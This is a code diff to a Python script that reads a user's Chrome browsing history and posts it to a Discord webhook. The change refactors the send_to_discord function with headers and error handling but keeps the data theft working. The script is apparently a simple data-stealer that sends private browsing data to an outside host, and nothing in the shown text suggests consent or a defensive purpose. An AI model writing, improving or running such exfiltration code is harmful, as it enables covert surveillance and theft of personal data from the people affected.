@@ -66,20 +66,30 @@ def get_chrome_history():
             else:
                 return f"Failed to access Chrome history after {retries} attempts."
 
-# Send the info to Discord
+# Send the info to Discord with enhanced error handling
 def send_to_discord(message):
+    headers = {
+        "Content-Type": "application/json",
+    }
+
     data = {
         "content": message,
     }
-    response = requests.post(webhook_url, json=data)
-    return response
+
+    try:
+        response = requests.post(webhook_url, json=data, headers=headers)
+
+        if response.status_code == 204:
+            print("History successfully sent to Discord!")
+        else:
+            print(f"Failed to send info. Status code: {response.status_code}")
+            print(f"Response: {response.text}")
+
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending request to Discord: {e}")
 
 # Main function
 if __name__ == "__main__":
     history_info = get_chrome_history()
     if history_info:
-        response = send_to_discord(history_info)
-        if response.status_code == 204:
-            print("History successfully sent to Discord!")
-        else:
-            print(f"Failed to send info. Status code: {response.status_code}")
+        send_to_discord(history_info)
